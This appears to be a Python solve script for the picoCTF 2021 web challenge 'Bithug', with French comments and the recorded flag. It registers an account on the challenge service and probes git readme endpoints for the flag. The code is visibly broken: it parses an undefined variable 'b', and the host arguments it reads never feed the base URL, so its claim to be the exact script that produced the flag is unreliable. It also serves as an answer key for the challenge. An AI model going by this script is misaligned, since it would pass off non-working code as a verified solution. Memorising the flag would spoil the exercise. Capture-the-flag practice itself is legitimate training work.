# 190 - Bithug  (Web Exploitation, picoCTF 2021)
# Flag: academy{good_job_at_gitting_good}
# Write-up: ../../../writeups/web-exploitation/190-bithug.md
# Script exact utilise pour produire le flag.
#
import sys, re, json, time, requests, urllib3

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()

base = None
for _ in range(10):
    time.sleep(0.8)
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"(https?://[A-Za-z0-9.\-]+:\d+)", d.get("description") or "")
    if m:
        base = m.group(1).rstrip("/") + "/"
        break
print("base:", base)
s = requests.Session()
user = "hug%d" % (int(time.time() * 10) % 1000000)
r = s.post(base + "api/register", json={"user": user, "password": "pw190"}, timeout=25)
print("register:", r.status_code, r.text[:150], "| cookies:", list(s.cookies.keys()))
time.sleep(0.6)
for path in ("_/%s.git/api/readme?ref=refs/heads/master" % user,
             "_/%s.git/api/readme?ref=master" % user,
             "api/self"):
    try:
        r2 = s.get(base + path, timeout=25)
        print("=== %s -> %d" % (path[:60], r2.status_code))
        print("   ", r2.text[:400])
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
        if m:
            print("FLAG:", m.group(0))
            break
    except Exception as e:
        print(path[:40], "ERR", type(e).__name__)
